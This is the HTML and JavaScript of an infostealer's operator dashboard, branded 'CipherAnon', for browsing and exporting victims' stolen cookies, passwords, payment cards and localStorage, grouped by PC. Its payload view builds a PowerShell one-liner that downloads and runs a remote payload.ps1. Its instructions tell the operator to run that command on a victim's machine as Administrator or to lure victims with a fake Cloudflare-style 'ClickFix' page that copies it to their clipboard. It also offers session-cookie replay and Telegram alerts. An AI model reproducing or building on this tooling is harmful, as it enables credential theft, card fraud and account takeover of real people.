                    <div class="sub">Stored data from all browsers</div>
                </div>
            </div>

            <div class="toolbar">
                <div class="left">
                    <button class="btn primary" onclick="downloadJSON()">📥 JSON</button>
                    <button class="btn warning" onclick="downloadNetscape()">📥 Netscape</button>
                    <button class="btn violet" onclick="downloadTxt()">📥 TXT</button>
                </div>
                <div class="right">
                    <button class="btn danger" onclick="showClearAllConfirm()">🗑️ Clear</button>
                    <button class="btn" onclick="fetchData(); fetchVisitors();">🔄 Refresh</button>
                </div>
            </div>

            <div class="pc-grid" id="pcGrid">
                <div class="empty-state">
                    <div class="icon">🖥️</div>
                    <h3>No data stolen yet</h3>
                    <p>Send victims to <code>/home</code></p>
                </div>
            </div>
        </div>

        <!-- VIEW: COOKIES -->
        <div class="view-content" id="viewCookies">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#64748b;font-size:12px;">All stolen cookies — grouped by PC</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>
            <div class="cookies-table-wrap" id="cookiesTableWrap">
                <div class="empty-state"><div class="icon">🍪</div><h3>No cookies stolen</h3></div>
            </div>
        </div>

        <!-- VIEW: VICTIMS -->
        <div class="view-content" id="viewVictims">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#64748b;font-size:12px;">All victims — grouped by PC</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>
            <div class="victims-grid" id="victimsGrid">
                <div class="empty-state"><div class="icon">👤</div><h3>No victims yet</h3></div>
            </div>
        </div>

        <!-- VIEW: CREDENTIALS -->
        <div class="view-content" id="viewCreds">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#ec4899;font-size:12px;">🔐 Stolen Credentials — grouped by PC</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>
            <div id="credsTableWrap">
                <div class="empty-state"><div class="icon">🔐</div><h3>No credentials stolen</h3></div>
            </div>
        </div>

        <!-- VIEW: CARDS -->
        <div class="view-content" id="viewCards">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#06b6d4;font-size:12px;">💳 Stolen Cards — grouped by PC</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>
            <div id="cardsTableWrap">
                <div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3></div>
            </div>
        </div>

        <!-- VIEW: LOCALSTORAGE -->
        <div class="view-content" id="viewStorage">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#8b5cf6;font-size:12px;">💾 Stolen LocalStorage — grouped by PC</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>
            <div id="storageTableWrap">
                <div class="empty-state"><div class="icon">💾</div><h3>No LocalStorage stolen</h3></div>
            </div>
        </div>

        <!-- VIEW: TRASH -->
        <div class="view-content" id="viewTrash">
            <div class="stats-row">
                <div class="stat-card">
                    <div class="label">Trash Items</div>
                    <div class="number orange" id="trashItemCount">0</div>
                    <div class="sub">Victims in trash</div>
                </div>
                <div class="stat-card">
                    <div class="label">Domains</div>
                    <div class="number purple" id="trashDomainCount">0</div>
                    <div class="sub">Unique domains</div>
                </div>
            </div>
            <div class="toolbar">
                <div class="left">
                    <button class="btn danger" onclick="showEmptyTrashConfirm()">🗑️ Empty Trash</button>
                </div>
                <div class="right">
                    <button class="btn" onclick="fetchTrash()">🔄 Refresh</button>
                    <button class="btn" onclick="switchView('main')">← Back</button>
                </div>
            </div>
            <div class="pc-grid" id="trashGrid">
                <div class="empty-state"><div class="icon">🗑️</div><h3>Trash is empty</h3></div>
            </div>
        </div>

        <!-- VIEW: REPLAY -->
        <div class="view-content" id="viewReplay">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#f472b6;font-size:12px;">▶️ Replay — grouped by PC</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>
            <div class="replay-grid" id="replayGrid">
                <div class="empty-state"><div class="icon">▶️</div><h3>No victims to replay</h3></div>
            </div>
        </div>

        <!-- VIEW: PAYLOAD GENERATOR -->
        <div class="view-content" id="viewPayload">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#fbbf24;font-size:12px;">📦 Payload Generator</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>

            <div class="payload-container">
                <div class="payload-card">
                    <div class="payload-title">
                        📍 Payload URL
                        <span class="badge">Copy & Share</span>
                    </div>
                    <div class="payload-desc">
                        The <code>payload.ps1</code> file hosted on your server. Victims download this and execute it.
                    </div>
                    <div class="payload-url" id="payloadUrlContainer">
                        <span class="url-text" id="payloadUrlDisplay"></span>
                        <button class="btn-icon-sm payload-copy" onclick="copyPayloadUrl()" title="Copy URL">📋</button>
                    </div>
                </div>

                <div class="payload-card">
                    <div class="payload-title">
                        ⚡ PowerShell Command
                        <span class="badge">One-Liner</span>
                    </div>
                    <div class="payload-desc">
                        Copy this command and paste it into a victim's PowerShell (as Administrator) to execute the payload.
                    </div>
                    <div class="payload-command" id="payloadCmdContainer">
                        <span class="cmd-text" id="payloadCmdDisplay"></span>
                        <button class="btn-icon-sm payload-copy" onclick="copyPayloadCmd()" title="Copy Command">📋</button>
                    </div>
                    <div class="payload-options">
                        <button class="btn payload-gold small" onclick="copyPayloadCmd()">📋 Copy Command</button>
                        <button class="btn payload-gold small" onclick="copyPayloadUrl()">📋 Copy URL</button>
                    </div>
                </div>

                <div class="payload-card">
                    <div class="payload-title">
                        🚀 ClickFix Link
                        <span class="badge">Social Engineering</span>
                    </div>
                    <div class="payload-desc">
                        Send this link to victims. They'll see a Cloudflare-style verification page that copies the command to their clipboard.
                    </div>
                    <div class="payload-url" id="payloadHomeContainer">
                        <span class="url-text" id="payloadHomeDisplay"></span>
                        <button class="btn-icon-sm payload-copy" onclick="copyPayloadHome()" title="Copy Link">📋</button>
                    </div>
                    <div class="payload-options">
                        <button class="btn payload-gold small" onclick="copyPayloadHome()">📋 Copy Link</button>
                        <a href="/home" target="_blank" class="btn primary small">🔗 Open</a>
                    </div>
                </div>

                <div class="payload-card">
                    <div class="payload-title">
                        🛠️ Instructions
                        <span class="badge">How To Use</span>
                    </div>
                    <div class="payload-desc" style="font-size:12px;color:#94a3b8;line-height:1.8;">
                        <div style="display:flex;gap:6px;margin-bottom:4px;">
                            <span style="color:#fbbf24;font-weight:600;">1.</span>
                            <span>Copy the <strong style="color:#f1f5f9;">PowerShell command</strong> above</span>
                        </div>
                        <div style="display:flex;gap:6px;margin-bottom:4px;">
                            <span style="color:#fbbf24;font-weight:600;">2.</span>
                            <span>Paste it into a victim's PowerShell (Run as Administrator)</span>
                        </div>
                        <div style="display:flex;gap:6px;margin-bottom:4px;">
                            <span style="color:#fbbf24;font-weight:600;">3.</span>
                            <span>Or send them the <strong style="color:#f1f5f9;">ClickFix link</strong> and have them follow the steps</span>
                        </div>
                        <div style="display:flex;gap:6px;">
                            <span style="color:#fbbf24;font-weight:600;">4.</span>
                            <span>Check the <strong style="color:#f1f5f9;">Dashboard</strong> for stolen data</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- VIEW: TESTER -->
        <div class="view-content" id="viewTester">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#64748b;font-size:12px;">Test all domains</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>
            <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:16px;">
                <button class="btn primary" onclick="testAllDomains()" style="width:100%;justify-content:center;padding:8px;margin-bottom:12px;">
                    🔍 Test All
                </button>
                <div id="testerResults" style="display:flex;flex-direction:column;gap:6px;">
                    <div style="color:#64748b;font-size:12px;text-align:center;">Click to test</div>
                </div>
            </div>
        </div>

        <!-- VIEW: EXPORT -->
        <div class="view-content" id="viewExport">
            <div class="toolbar" style="margin-bottom:12px;">
                <div class="left"><span style="color:#64748b;font-size:12px;">Export formats</span></div>
                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
            </div>
            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;">
                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
                    <div style="font-size:28px;margin-bottom:4px;">📄</div>
                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">JSON</div>
                    <button class="btn primary" onclick="downloadJSON()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;">Download</button>
                </div>
                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
                    <div style="font-size:28px;margin-bottom:4px;">📋</div>
                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">Netscape</div>
                    <button class="btn warning" onclick="downloadNetscape()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;">Download</button>
                </div>
                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
                    <div style="font-size:28px;margin-bottom:4px;">📊</div>
                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">CSV</div>
                    <button class="btn" onclick="exportCSV()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;border-color:#8b5cf6;color:#8b5cf6;">Download</button>
                </div>
                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
                    <div style="font-size:28px;margin-bottom:4px;">📑</div>
                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">Raw JSON</div>
                    <button class="btn" onclick="exportRawJSON()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;border-color:#f59e0b;color:#f59e0b;">Download</button>
                </div>
                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
                    <div style="font-size:28px;margin-bottom:4px;">📝</div>
                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">TXT</div>
                    <button class="btn violet" onclick="downloadTxt()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;">Download</button>
                </div>
            </div>
        </div>

        <div class="powered-footer">
            Powered By <span class="name">CipherAnon</span>
        </div>
    </div>

    <!-- RENAME MODAL -->
    <div class="rename-overlay" id="renameOverlay">
        <div class="rename-box">
            <h2>✏️ Rename PC</h2>
            <p>Enter a new name for this PC. This will update all victims under it.</p>
            <div class="form-group">
                <label>New PC Name</label>
                <input type="text" id="renameInput" placeholder="Enter new PC name..." />
            </div>
            <div class="btn-group">
                <button class="btn cancel" onclick="closeRename()">Cancel</button>
                <button class="btn confirm" onclick="confirmRename()">Rename</button>
            </div>
        </div>
    </div>

    <!-- MODAL -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal">
            <button class="close" onclick="closeModal()">✕</button>
            <h2 id="modalTitle">Victim Details</h2>
            <div id="modalContent"></div>
            <div class="session-actions">
                <button class="btn primary" onclick="replayFromModal()">▶️ Replay Cookies</button>
                <button class="btn violet" onclick="replayStorageFromModal()">💾 Replay Storage</button>
                <button class="btn test" style="border-color:#3b82f6;color:#3b82f6;" onclick="testFromModal()">🔍 Test</button>
                <button class="btn violet" onclick="downloadModalTxt()">📥 TXT</button>
            </div>
            <div class="test-result" id="testResultModal"></div>
        </div>
    </div>

    <div class="settings-modal-overlay" id="settingsOverlay">
        <div class="settings-modal">
            <button class="close" onclick="closeSettings()">✕</button>
            <h2>⚙️ Settings</h2>
            <div style="border-bottom:1px solid #1a2538;padding-bottom:12px;margin-bottom:12px;">
                <div class="section-title">🔒 Change Password</div>
                <div class="form-group">
                    <label>Current Password</label>
                    <input type="password" id="oldPassword" placeholder="Current password" />
                    <div class="error-text" id="oldPasswordError">Incorrect</div>
                </div>
                <div class="form-group">
                    <label>New Password</label>
                    <input type="password" id="newPassword" placeholder="Min 4 chars" />
                    <div class="error-text" id="newPasswordError">Min 4 chars</div>
                </div>
                <div class="form-group">
                    <label>Confirm</label>
                    <input type="password" id="confirmPassword" placeholder="Confirm" />
                    <div class="error-text" id="confirmPasswordError">No match</div>
                </div>
                <button class="btn primary" onclick="changePassword()" style="width:100%;justify-content:center;">Change</button>
            </div>
            <div>
                <div class="section-title">🤖 Telegram Settings</div>
                <div class="form-group">
                    <label>Bot Token</label>
                    <input type="text" id="telegramToken" placeholder="Token from @BotFather" />
                    <div class="help-text"><a href="https://t.me/BotFather" target="_blank">@BotFather</a></div>
                </div>
                <div class="form-group">
                    <label>Chat ID</label>
                    <input type="text" id="telegramChatId" placeholder="Chat ID" />
                    <div class="help-text"><a href="https://t.me/userinfobot" target="_blank">@userinfobot</a></div>
                </div>
                <div class="form-group">
                    <label class="checkbox-label">
                        <input type="checkbox" id="telegramNotifications" checked />
                        Send notifications
                    </label>
                </div>
                <button class="btn primary" onclick="updateTelegramSettings()" style="width:100%;justify-content:center;">Save</button>
            </div>
            <div class="info-text">
                Username: <span class="key">admin</span> · Settings saved to config.json
            </div>
        </div>
    </div>

    <div class="logout-confirm-overlay" id="logoutConfirmOverlay">
        <div class="logout-confirm-box">
            <div class="icon">🚪</div>
            <h3>Confirm Logout</h3>
            <p>You will need to login again.</p>
            <div class="btn-group">
                <button class="btn cancel" onclick="hideLogoutConfirm()">Cancel</button>
                <button class="btn confirm" onclick="executeLogout()">Logout</button>
            </div>
        </div>
    </div>

    <div class="custom-confirm-overlay" id="customConfirmOverlay">
        <div class="custom-confirm-box">
            <div class="icon" id="confirmIcon">⚠️</div>
            <h3 id="confirmTitle">Confirm</h3>
            <p id="confirmMessage">Are you sure?</p>
            <div class="btn-group">
                <button class="btn cancel" onclick="hideCustomConfirm()">Cancel</button>
                <button class="btn confirm" id="confirmActionBtn" onclick="executeConfirmAction()">Confirm</button>
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <!-- ============================================================
    DASHBOARD LOGIC — ALL FEATURES + AUTO-DETECT URL
    ============================================================ -->
    <script>
        // ============================================================
        // SESSION CHECK
        // ============================================================

        async function checkSession() {
            try {
                const res = await fetch('/api/data');
                if (res.status === 401) {
                    window.location.href = '/login';
                    return false;
                }
                return true;
            } catch (e) {
                window.location.href = '/login';
                return false;
            }
        }

        // ============================================================
        // STATE
        // ============================================================

        let allData = [];
        let trashData = [];
        let currentModalEntry = null;
        let currentModalDomain = null;
        let currentView = 'main';
        let isTestingAll = false;
        let confirmCallback = null;
        let passwordVisibility = {};
        let renameTarget = null;

        let pcOpenState = {};

        const VALUABLE_PATTERNS = ['session','token','auth','login','sid','uid','PHPSESSID','jwt','access_token','refresh_token','api_key','secret','csrf','__Secure','__Host','laravel_session','remember','wordpress_logged_in','wp_session','drupal_session'];

        function isValuable(n) {
            const l = n.toLowerCase();
            return VALUABLE_PATTERNS.some(p => l.includes(p.toLowerCase()));
        }

        function getFlagEmoji(code) {
            if (!code || code === 'XX') return '🌍';
            try {
                const cp = code.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0));
                return String.fromCodePoint(...cp);
            } catch { return '🌍'; }
        }

        function timeAgo(dateString) {
            if (!dateString) return 'Unknown';
            try {
                const now = new Date();
                const past = new Date(dateString);
                if (isNaN(past.getTime())) return 'Invalid date';
                const diffMs = now - past;
                if (diffMs < 0) return 'Future date';
                const diffSec = Math.floor(diffMs / 1000);
                const diffMin = Math.floor(diffSec / 60);
                const diffHour = Math.floor(diffMin / 60);
                const diffDay = Math.floor(diffHour / 24);

                if (diffSec < 10) return 'Just now';
                if (diffSec < 60) return `${diffSec}s ago`;
                if (diffMin < 60) return `${diffMin}m ago`;
                if (diffHour < 24) return `${diffHour}h ago`;
                if (diffDay < 7) return `${diffDay}d ago`;
                return past.toLocaleDateString();
            } catch {
                return 'Invalid date';
            }
        }

        function formatFullTime(dateString) {
            if (!dateString) return 'Unknown';
            try {
                const d = new Date(dateString);
                if (isNaN(d.getTime())) return 'Invalid date';
                return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
            } catch {
                return 'Invalid date';
            }
        }

        function showToast(msg, type) {
            const el = document.getElementById('toast');
            el.textContent = msg;
            el.className = 'toast show ' + (type || '');
            clearTimeout(el._timer);
            el._timer = setTimeout(() => { el.className = 'toast'; }, 3000);
        }

        // ============================================================
        // CUSTOM CONFIRM
        // ============================================================

        function showCustomConfirm(title, message, icon, callback, danger = false) {
            document.getElementById('confirmTitle').textContent = title;
            document.getElementById('confirmMessage').textContent = message;
            document.getElementById('confirmIcon').textContent = icon || '⚠️';
            const btn = document.getElementById('confirmActionBtn');
            btn.className = danger ? 'btn danger-confirm' : 'btn confirm';
            btn.textContent = danger ? '🗑️ Confirm' : 'Confirm';
            confirmCallback = callback;
            document.getElementById('customConfirmOverlay').classList.add('active');
        }

        function hideCustomConfirm() {
            document.getElementById('customConfirmOverlay').classList.remove('active');
            confirmCallback = null;
        }

        function executeConfirmAction() {
            if (confirmCallback) {
                const cb = confirmCallback;
                confirmCallback = null;
                hideCustomConfirm();
                cb();
            } else {
                hideCustomConfirm();
            }
        }

        // ============================================================
        // SIDEBAR
        // ============================================================

        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('open');
            document.getElementById('sidebarOverlay').classList.toggle('active');
        }

        function closeSidebar() {
            document.getElementById('sidebar').classList.remove('open');
            document.getElementById('sidebarOverlay').classList.remove('active');
        }

        // ============================================================
        // VIEW SWITCHING
        // ============================================================

        function switchView(view) {
            currentView = view;
            document.querySelectorAll('.view-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));

            const viewMap = {
                'main': { viewId: 'viewMain', navId: 'navMain', title: 'Dashboard', sub: 'Monitor stolen data · ' },
                'cookies': { viewId: 'viewCookies', navId: 'navCookies', title: '🍪 All Cookies', sub: 'Grouped by PC' },
                'victims': { viewId: 'viewVictims', navId: 'navVictims', title: '👤 All Victims', sub: 'Grouped by PC' },
                'creds': { viewId: 'viewCreds', navId: 'navCreds', title: '🔐 Credentials', sub: 'Grouped by PC' },
                'cards': { viewId: 'viewCards', navId: 'navCards', title: '💳 Cards', sub: 'Grouped by PC' },
                'storage': { viewId: 'viewStorage', navId: 'navStorage', title: '💾 LocalStorage', sub: 'Grouped by PC' },
                'trash': { viewId: 'viewTrash', navId: 'navTrash', title: '🗑️ Trash', sub: 'Deleted victims' },
                'replay': { viewId: 'viewReplay', navId: 'navReplay', title: '▶️ Replay', sub: 'Grouped by PC' },
                'payload': { viewId: 'viewPayload', navId: 'navPayload', title: '📦 Payload', sub: 'Generate & copy payload links' },
                'tester': { viewId: 'viewTester', navId: 'navTester', title: '🔍 Tester', sub: 'Test all domains' },
                'export': { viewId: 'viewExport', navId: 'navExport', title: '📥 Export Data', sub: 'Export formats' }
            };

            const info = viewMap[view];
            if (info) {
                document.getElementById(info.viewId).classList.add('active');
                document.getElementById(info.navId).classList.add('active');
                document.getElementById('pageTitle').textContent = info.title;
                document.getElementById('pageSub').innerHTML = info.sub + ' · <span class="accent">Cipher Anon</span>';
            }

            closeSidebar();

            if (view === 'cookies') renderCookiesView();
            else if (view === 'victims') renderVictimsView();
            else if (view === 'creds') renderCredsView();
            else if (view === 'cards') renderCardsView();
            else if (view === 'storage') renderStorageView();
            else if (view === 'replay') renderReplayView();
            else if (view === 'payload') updatePayloadUrls();
            else if (view === 'main') { fetchData(); fetchVisitors(); }
            else if (view === 'trash') fetchTrash();
        }

        // ============================================================
        // FETCH DATA
        // ============================================================

        async function fetchData() {
            try {
                const res = await fetch('/api/data');
                if (res.status === 401) { window.location.href = '/login'; return; }
                allData = await res.json();
                render(allData);
                updateSidebarCounts(allData);

                if (currentView === 'creds') renderCredsView();
                if (currentView === 'cards') renderCardsView();
                if (currentView === 'cookies') renderCookiesView();
                if (currentView === 'victims') renderVictimsView();
                if (currentView === 'storage') renderStorageView();
                if (currentView === 'replay') renderReplayView();
            } catch(e) {
                if (e.message && e.message.includes('401')) window.location.href = '/login';
                else showToast('⚠️ Failed to fetch data', 'error');
            }
        }

        async function fetchTrash() {
            try {
                const res = await fetch('/api/trash');
                if (res.status === 401) { window.location.href = '/login'; return; }
                trashData = await res.json();
                renderTrash(trashData);
                document.getElementById('trashCount').textContent = trashData.length;
                document.getElementById('trashItemCount').textContent = trashData.length;
                document.getElementById('trashDomainCount').textContent = new Set(trashData.map(e => e.fingerprint?.hostname || e.domain || 'unknown')).size;
            } catch(e) {
                if (e.message && e.message.includes('401')) window.location.href = '/login';
                else showToast('⚠️ Failed to fetch trash', 'error');
            }
        }

        // ============================================================
        // FETCH VISITORS
        // ============================================================

        async function fetchVisitors() {
            try {
                const res = await fetch('/api/visits');
                if (res.status === 401) return;
                const data = await res.json();
                document.getElementById('statVisitors').textContent = data.totalVisits || 0;
                document.getElementById('visitorSub').textContent = '🏠 ' + (data.homeVisits || 0) + ' home · 📦 ' + (data.payloadDownloads || 0) + ' payload';
            } catch (e) {
                console.log('Failed to fetch visitors');
            }
        }

        // ============================================================
        // UPDATE SIDEBAR COUNTS
        // ============================================================

        function updateSidebarCounts(data) {
            let totalCookies = 0;
            let totalCreds = 0;
            let totalCards = 0;
            let totalStorage = 0;
            const victims = data.length;
            const pcs = new Set();

            data.forEach(entry => {
                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                pcs.add(pc);
                totalCookies += Object.keys(entry.cookies || {}).length;
                totalCreds += (entry.credentials || []).length;
                totalCards += (entry.cards || []).length;
                totalStorage += Object.keys(entry.localStorage || {}).length;
            });

            document.getElementById('statPcs').textContent = pcs.size;
            document.getElementById('statVictims').textContent = victims;
            document.getElementById('statCookies').textContent = totalCookies;
            document.getElementById('statCredentials').textContent = totalCreds;
            document.getElementById('statCards').textContent = totalCards;
            document.getElementById('statStorage').textContent = totalStorage;
            document.getElementById('cookiesCount').textContent = totalCookies;
            document.getElementById('victimsCount').textContent = victims;
            document.getElementById('credsCount').textContent = totalCreds;
            document.getElementById('cardsCount').textContent = totalCards;
            document.getElementById('storageCount').textContent = totalStorage;
        }

        // ============================================================
        // PAYLOAD URL GENERATOR — AUTO-DETECT
        // ============================================================

        function getBaseUrl() {
            return window.location.origin;
        }

        function updatePayloadUrls() {
            const baseUrl = getBaseUrl();
            document.getElementById('payloadUrlDisplay').textContent = baseUrl + '/payload.ps1';
            document.getElementById('payloadCmdDisplay').textContent = "iex (New-Object Net.WebClient).DownloadString('" + baseUrl + "/payload.ps1')";
            document.getElementById('payloadHomeDisplay').textContent = baseUrl + '/home';
        }

        function copyPayloadUrl() {
            const text = document.getElementById('payloadUrlDisplay').textContent;
            copyText(text);
        }

        function copyPayloadCmd() {
            const text = document.getElementById('payloadCmdDisplay').textContent;
            copyText(text);
        }

        function copyPayloadHome() {
            const text = document.getElementById('payloadHomeDisplay').textContent;
            copyText(text);
        }

        // ============================================================
        // EXTRACT DOMAIN
        // ============================================================

        function extractDomain(entry) {
            const cookies = entry.cookies || {};
            const cookieKeys = Object.keys(cookies);
            let domain = '';
            
            for (const key of cookieKeys) {
                const parts = key.split('|');
                if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0] !== '' && parts[0].length > 2) {
                    domain = parts[0];
                    break;
                }
            }
            
            if (!domain || domain === 'unknown' || domain.length < 3) {
                for (const key of cookieKeys) {
                    if (key.includes('.') && !key.includes(' ') && key.length > 3 && !key.includes('__')) {
                        const parts = key.split('.');
                        if (parts.length >= 2 && parts[0].length > 1) {
                            domain = parts[0] + '.' + parts[1];
                            break;
                        }
                    }
                }
            }
            
            if (!domain || domain === 'unknown' || domain.length < 3) {
                const storage = entry.localStorage || {};
                for (const key of Object.keys(storage)) {
                    const parts = key.split(':');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0].length > 2) {
                        domain = parts[0];
                        break;
                    }
                }
            }
            
            if (!domain || domain === 'unknown' || domain.length < 3) {
                const creds = entry.credentials || [];
                for (const c of creds) {
                    const url = c.url || c.origin_url || '';
                    if (url && !url.includes('railway.app') && url.length > 2) {
                        const clean = url.replace(/^https?:\/\//, '').replace(/\/.*$/, '').trim();
                        if (clean && clean.length > 2 && clean.includes('.')) {
                            domain = clean;
                            break;
                        }
                    }
                }
            }
            
            if (!domain || domain === 'unknown' || domain.length < 3) {
                const cards = entry.cards || [];
                for (const c of cards) {
                    const url = c.url || '';
                    if (url && !url.includes('railway.app') && url.length > 2) {
                        const clean = url.replace(/^https?:\/\//, '').replace(/\/.*$/, '').trim();
                        if (clean && clean.length > 2 && clean.includes('.')) {
                            domain = clean;
                            break;
                        }
                    }
                }
            }
            
            if (!domain || domain === 'unknown' || domain.length < 3) {
                const fallback = entry.fingerprint?.hostname || entry.domain || '';
                if (fallback && fallback.includes('.') && !fallback.includes(' ') && !fallback.includes('_') && fallback.length > 3) {
                    const isPcName = /^[A-Z0-9\-_]+$/.test(fallback) || fallback.includes(' ') || !fallback.includes('.');
                    if (!isPcName) {
                        domain = fallback;
                    }
                }
            }
            
            domain = domain.replace(/^\./, '').replace(/\/.*$/, '').trim();
            return domain || 'unknown';
        }

        // ============================================================
        // GROUP BY PC HELPER
        // ============================================================

        function groupByPC(data) {
            const grouped = {};
            data.forEach(entry => {
                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                if (!grouped[pc]) {
                    grouped[pc] = {
                        pcName: pc,
                        ip: entry.ip || 'Unknown',
                        country: entry.country || 'Unknown',
                        countryCode: entry.countryCode || 'XX',
                        latestTime: entry.receivedAt || new Date().toISOString(),
                        totalVictims: 0,
                        totalCookies: 0,
                        totalCreds: 0,
                        totalCards: 0,
                        totalStorage: 0,
                        entries: [],
                        domains: {}
                    };
                }
                
                let domain = extractDomain(entry);
                
                if (!grouped[pc].domains[domain]) {
                    grouped[pc].domains[domain] = {
                        domain: domain,
                        entries: [],
                        cookies: 0,
                        creds: 0,
                        cards: 0,
                        storage: 0,
                        latestTime: entry.receivedAt || new Date().toISOString()
                    };
                }
                grouped[pc].domains[domain].entries.push(entry);
                grouped[pc].domains[domain].cookies += Object.keys(entry.cookies || {}).length;
                grouped[pc].domains[domain].creds += (entry.credentials || []).length;
                grouped[pc].domains[domain].cards += (entry.cards || []).length;
                grouped[pc].domains[domain].storage += Object.keys(entry.localStorage || {}).length;
                if (entry.receivedAt && entry.receivedAt > grouped[pc].domains[domain].latestTime) {
                    grouped[pc].domains[domain].latestTime = entry.receivedAt;
                }

                grouped[pc].totalVictims++;
                grouped[pc].totalCookies += Object.keys(entry.cookies || {}).length;
                grouped[pc].totalCreds += (entry.credentials || []).length;
                grouped[pc].totalCards += (entry.cards || []).length;
                grouped[pc].totalStorage += Object.keys(entry.localStorage || {}).length;
                grouped[pc].entries.push(entry);
                if (entry.receivedAt && entry.receivedAt > grouped[pc].latestTime) {
                    grouped[pc].latestTime = entry.receivedAt;
                    grouped[pc].ip = entry.ip || 'Unknown';
                    grouped[pc].country = entry.country || 'Unknown';
                    grouped[pc].countryCode = entry.countryCode || 'XX';
                }
            });
            return grouped;
        }

        // ============================================================
        // RENDER DASHBOARD
        // ============================================================

        function render(data) {
            const grouped = groupByPC(data);
            const pcNames = Object.keys(grouped);

            const grid = document.getElementById('pcGrid');
            grid.innerHTML = '';

            if (pcNames.length === 0) {
                grid.innerHTML = `<div class="empty-state"><div class="icon">🖥️</div><h3>No data stolen yet</h3><p>Send victims to <code>/home</code></p></div>`;
                return;
            }

            let totalVictims = 0;
            pcNames.forEach(pcName => { totalVictims += grouped[pcName].totalVictims; });
            const header = document.createElement('div');
            header.style.cssText = 'font-size:14px;font-weight:700;color:#f1f5f9;padding:4px 2px 12px 2px;border-bottom:1px solid #1a2538;margin-bottom:8px;display:flex;align-items:center;gap:10px;';
            header.innerHTML = `👤 All Victims <span style="color:#64748b;font-weight:400;font-size:13px;">(${totalVictims} total)</span>`;
            grid.appendChild(header);

            pcNames.forEach((pcName) => {
                const pc = grouped[pcName];
                const flag = getFlagEmoji(pc.countryCode);
                const domainNames = Object.keys(pc.domains);
                
                const safeName = 'pc-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
                if (pcOpenState[safeName] === undefined) {
                    pcOpenState[safeName] = false;
                }
                const isOpen = pcOpenState[safeName];

                let domainsHtml = '';
                domainNames.forEach(domain => {
                    const d = pc.domains[domain];
                    const hasCookies = d.cookies > 0;
                    const hasStorage = d.storage > 0;
                    const firstEntry = d.entries[0] || null;
                    const entryId = firstEntry ? firstEntry._uniqueId : '';

                    const displayDomain = domain === 'unknown' ? '🌐 unknown' : '🌐 ' + domain;

                    domainsHtml += `
                        <div class="domain-item" onclick="event.stopPropagation(); openModalForEntry('${entryId}')" style="cursor:pointer;">
                            <span class="domain-name">${displayDomain}</span>
                            <div class="domain-stats">
                                <span class="cookies">🍪 ${d.cookies}</span>
                                ${d.creds > 0 ? `<span class="creds">🔐 ${d.creds}</span>` : ''}
                                ${d.cards > 0 ? `<span class="cards">💳 ${d.cards}</span>` : ''}
                                ${d.storage > 0 ? `<span class="storage">💾 ${d.storage}</span>` : ''}
                            </div>
                            <div class="domain-actions">
                                <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayDomainForPC('${pcName.replace(/'/g, "\\'")}', '${domain}')` : ''}" title="${hasCookies ? 'Replay cookies' : 'No cookies'}">▶️</button>
                                <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayStorageDomain('${pcName.replace(/'/g, "\\'")}', '${domain}')` : ''}" title="${hasStorage ? 'Replay storage' : 'No storage'}">💾</button>
